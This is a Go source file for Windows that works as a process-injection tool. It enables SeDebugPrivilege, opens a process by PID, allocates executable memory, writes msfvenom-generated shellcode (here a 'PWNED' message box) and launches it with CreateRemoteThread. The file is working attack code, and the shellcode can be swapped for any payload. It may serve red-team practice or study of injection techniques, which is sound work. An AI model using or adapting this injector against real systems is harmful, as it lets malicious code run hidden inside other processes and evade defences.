package main

import (
	"os"
	"fmt"
	"syscall"
	"unsafe"
	"encoding/hex"
)

// CHANGE THESE
var (
	PID = 0
	// msfvenom -p windows/x64/messagebox TEXT="PWNED" TITLE="PWNED" ICON=WARNING EXITFUNC=thread -f hex
	shellcode = "fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1300000003e488d951a0100003e4c8d85200100004831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd550574e45440050574e454400"
)

const (
	// Constants for P/Invokes
	TOKEN_ADJUST_PRIVILEGES	  = 0x0020
	SE_PRIVILEGE_ENABLED 	  = 0x2
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	PAGE_EXECUTE_READWRITE    = 0x40
	PROCESS_CREATE_THREAD	  = 0x0002
	PROCESS_VM_OPERATION 	  = 0x0008
	PROCESS_VM_WRITE 	  = 0x0020
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	OpenProcess        = kernel32.MustFindProc("OpenProcess")
	GetCurrentProcess  = kernel32.MustFindProc("GetCurrentProcess")
	OpenProcessToken   = kernel32.MustFindProc("OpenProcessToken")
	VirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	CreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")

	advapi32              = syscall.MustLoadDLL("advapi32.dll")
	AdjustTokenPrivileges = advapi32.MustFindProc("AdjustTokenPrivileges")
	LookupPrivilegeValue  = advapi32.MustFindProc("LookupPrivilegeValueW")
)

// Types for P/Invokes
type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_ATTRIBUTES
}

func error(s string) {
	fmt.Printf("\n[!] %s failure\n", s)
	os.Exit(1)
}

func main() {
	fmt.Println("[*] Enabling SeDebugPrivilege...")
	procHandle, _, _ := GetCurrentProcess.Call()

	var tokenHandle uintptr
	ret, _, _ := OpenProcessToken.Call(procHandle, TOKEN_ADJUST_PRIVILEGES, uintptr(unsafe.Pointer(&tokenHandle)))
	if ret == 0 {
		error("OpenProcessToken")
		return
	}

	seDebug, e := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if e != nil {
		error("UTF16PtrFromString")
		return
	}

	var luid LUID
	ret, _, _ = LookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(seDebug)), uintptr(unsafe.Pointer(&luid)))
	if ret == 0 {
		error("LookupPrivilegeValue")
		return
	}

	var tokenPrivileges TOKEN_PRIVILEGES
	tokenPrivileges.PrivilegeCount = 1
	tokenPrivileges.Privileges[0].Luid = luid
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	ret, _, _ = AdjustTokenPrivileges.Call(tokenHandle, 0, uintptr(unsafe.Pointer(&tokenPrivileges)), uintptr(unsafe.Sizeof(tokenPrivileges)), 0, 0)
	if ret == 0 {
		error("AdjustTokenPrivileges")
		return
	}

	fmt.Println("[*] Injecting shellcode...")
	shellcodeBytes, _ := hex.DecodeString(shellcode)
	processHandle, _, _ := OpenProcess.Call(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE, 0, uintptr(PID))
	if procHandle == 0 {
		error("OpenProcess")
		return
	}

	shellcodeAddress, _, _ := VirtualAllocEx.Call(processHandle, 0, uintptr(len(shellcodeBytes)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if shellcodeAddress == 0 {
		error("VirtualAllocEx")
		return
	}

	ret, _, _ = WriteProcessMemory.Call(processHandle, shellcodeAddress, uintptr(unsafe.Pointer(&shellcodeBytes[0])), uintptr(len(shellcodeBytes)), 0)
	if ret == 0 {
		error("WriteProcessMemory")
		return
	}

	ret, _, _ = CreateRemoteThread.Call(processHandle, 0, 0, shellcodeAddress, 0, 0, 0)
	if ret == 0 {
		error("CreateRemoteThread")
		return
	}
}
